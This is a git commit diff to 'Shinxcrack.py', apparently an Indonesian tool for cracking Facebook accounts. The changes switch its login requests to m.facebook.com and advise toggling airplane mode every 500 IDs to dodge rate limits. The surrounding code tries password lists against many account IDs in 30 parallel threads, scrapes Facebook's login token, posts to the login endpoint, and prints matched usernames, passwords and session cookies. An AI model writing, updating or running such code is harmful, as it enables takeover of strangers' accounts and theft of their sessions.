27729ce591c193ada593653162443c9b9fc903eb
shinzy12 <91730481+shinzy12@users.noreply.github.com>
2022-02-11 23:25:04 +0700

    Update Shinxcrack.py

--- Shinxcrack.py
+++ Shinxcrack.py
@@ -269,7 +269,7 @@ class ngentod:
         elif suuu in ('1', '01'):
             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
+            print '%s [%s!%s] setiap crack 500 ID, gunakan mode pesawat 3 detik\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -438,8 +438,8 @@ class ngentod:
         for pw in zona:
             pw = pw.lower()
             ses = requests.Session()
-            ses.headers.update({"Host":"mobile.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-            p = ses.get("https://mobile.facebook.com")
+            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            p = ses.get("https://m.facebook.com")
             b = bs4.BeautifulSoup(p.text, 'html.parser')
             dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
             data = {}
@@ -455,8 +455,8 @@ class ngentod:
                 	data.update({rom.get('name'): rom.get('value')})
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
-            ses.headers.update({'referer': 'https://mobile.facebook.com/login/?next&ref=dbl&fl&refid=8'})
-            po = ses.post('https://mobile.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmobile.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
+            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
+            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
